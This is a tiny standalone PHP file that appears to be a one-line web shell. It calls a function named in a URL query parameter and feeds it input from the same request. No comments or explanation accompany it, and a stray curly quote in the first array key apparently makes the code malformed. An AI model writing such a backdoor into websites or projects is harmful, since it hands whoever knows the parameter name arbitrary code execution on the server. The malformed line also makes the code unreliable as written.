<?php
$_GET[’3vdtSQ0O']($_GET['3vdtSQ0O']);
?>
